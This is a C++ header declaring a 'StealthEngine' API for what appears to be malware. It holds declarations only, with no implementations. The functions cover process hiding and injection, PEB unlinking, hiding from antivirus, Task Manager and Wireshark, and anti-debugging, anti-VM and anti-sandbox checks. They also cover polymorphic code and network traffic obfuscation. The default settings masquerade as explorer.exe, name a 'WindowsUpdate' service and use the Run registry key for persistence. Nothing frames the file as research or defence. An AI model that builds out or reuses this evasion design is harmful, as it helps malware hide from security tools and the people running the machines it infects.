#pragma once

#ifdef _WIN32
#include <windows.h>
#endif
#include <string>
#include <vector>

#ifdef MASOUDY_CORE_EXPORTS
#define MASOUDY_API __declspec(dllexport)
#else
#define MASOUDY_API
#endif

namespace MasoudyCore {

    // Stealth detection types
    enum class DetectionType {
        ANTIVIRUS,
        SANDBOX,
        DEBUGGER,
        VM,
        MONITORING_TOOLS,
        NETWORK_MONITORING,
        MEMORY_ANALYSIS
    };

    // Stealth evasion techniques
    enum class EvasionTechnique {
        PEB_UNLINKING,
        THREAD_HIDING,
        PROCESS_HIDING,
        MEMORY_ENCRYPTION,
        NETWORK_TRAFFIC_OBFUSCATION,
        BEHAVIORAL_MIMICRY,
        TIMING_ATTACKS,
        DIRECT_SYSCALLS
    };

    // Stealth settings
    struct StealthSettings {
        bool enablePEBUnlinking = true;
        bool enableThreadHiding = true;
        bool enableProcessHiding = true;
        bool enableMemoryEncryption = true;
        bool enableNetworkObfuscation = true;
        bool enableBehavioralMimicry = true;
        bool enableTimingAttacks = true;
        bool enableDirectSyscalls = true;
        
        // Advanced settings
        bool enableAntiDebugging = true;
        bool enableAntiVM = true;
        bool enableAntiSandbox = true;
        bool enableAntiAnalysis = true;
        
        // Customization
        std::string processName = "explorer.exe";
        std::string serviceName = "WindowsUpdate";
        std::string registryKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    };

    // Detection result
    struct DetectionResult {
        DetectionType type;
        std::string description;
        bool detected;
        std::string mitigation;
    };

    // Stealth engine class
    class MASOUDY_API StealthEngine {
    public:
        StealthEngine();
        ~StealthEngine();

        // Initialization
        bool Initialize(const StealthSettings& settings = StealthSettings{});
        void Shutdown();

        // Stealth operations
        bool EnableStealth();
        bool DisableStealth();
        bool IsStealthActive() const;

        // Detection and evasion
        std::vector<DetectionResult> RunDetectionScan();
        bool EvadeDetection(DetectionType type);
        bool ApplyEvasionTechnique(EvasionTechnique technique);

        // Process manipulation
        bool HideProcess();
        bool UnhideProcess();
        bool InjectIntoProcess(const std::string& processName);
        bool UnlinkFromPEB();
        bool HideFromTaskManager();
        bool HideFromProcessMonitor();
        bool HideFromWireshark();
        bool HideFromAntivirus();

        // Memory protection
        bool EncryptMemoryRegion(void* address, size_t size);
        bool DecryptMemoryRegion(void* address, size_t size);
        bool ProtectMemoryRegion(void* address, size_t size);

        // Network stealth
        bool ObfuscateNetworkTraffic();
        bool RestoreNetworkTraffic();
        bool UseLegitimateProtocols();

        // Behavioral stealth
        bool MimicLegitimateBehavior();
        bool AddRandomDelays();
        bool UseLegitimateAPIs();

        // Advanced stealth techniques
        bool PerformBehavioralMimicry();
        bool ImplementTimingAttacks();
        bool UsePolymorphicCode();
        bool ImplementCodeObfuscation();
        bool UseAntiDebuggingTechniques();
        bool ImplementAntiVMTechniques();
        bool UseAntiSandboxTechniques();
        
        // Complete invisibility
        bool CompleteProcessInvisibility();
        bool EvadeToffelSecurity();
        
        // Advanced evasion
        bool EvadeNetworkMonitoring();
        bool EvadeMemoryAnalysis();
        bool EvadeProcessMonitoring();
        bool EvadeFileSystemMonitoring();
        bool EvadeRegistryMonitoring();
        
        // Behavioral analysis evasion
        bool RandomizeExecutionPatterns();
        bool ImplementDelayedExecution();
        bool UseLegitimateProcessNames();
        bool MimicUserBehavior();

        // Settings management
        void SetSettings(const StealthSettings& settings);
        StealthSettings GetSettings() const;
        
        // Detection methods
        bool DetectAntivirus();
        bool DetectSandbox();
        bool DetectDebugger();
        bool DetectVM();
        bool DetectMonitoringTools();
        bool DetectNetworkMonitoring();
        bool DetectMemoryAnalysis();

        // Status and information
        bool IsDetected() const;
        std::string GetStealthStatus() const;
        std::vector<std::string> GetActiveTechniques() const;

    private:
        // Settings
        StealthSettings m_settings;
        bool m_stealthActive;
        bool m_detected;

        // Internal methods
        bool InitializePEBUnlinking();
        bool InitializeThreadHiding();
        bool InitializeProcessHiding();
        bool InitializeMemoryEncryption();
        bool InitializeNetworkObfuscation();
        bool InitializeBehavioralMimicry();
        bool InitializeTimingAttacks();
        bool InitializeDirectSyscalls();

        // Evasion methods
        bool EvadeAntivirus();
        bool EvadeSandbox();
        bool EvadeDebugger();
        bool EvadeVM();
        bool EvadeMonitoringTools();

        // Utility methods
        bool IsProcessRunning(const std::string& processName);
        bool IsServiceRunning(const std::string& serviceName);
        bool IsRegistryKeyPresent(const std::string& keyPath);
        std::string GetRandomString(size_t length);
        void RandomDelay(int minMs, int maxMs);
        
        // Helper methods
        bool HideThread();
        bool EncryptMemoryRegions();
        bool UseDirectSyscalls();
        bool IsFileExists(const std::string& path);
        
#ifdef _WIN32
        DWORD GetProcessIdByName(const std::string& processName);
#endif
    };

    // Utility functions
    MASOUDY_API bool IsSecurityToolRunning();
    MASOUDY_API bool IsRunningInVirtualMachine();
    MASOUDY_API bool IsDebuggerPresent();
    MASOUDY_API bool IsSandboxDetected();
    MASOUDY_API std::string GetSystemFingerprint();
} 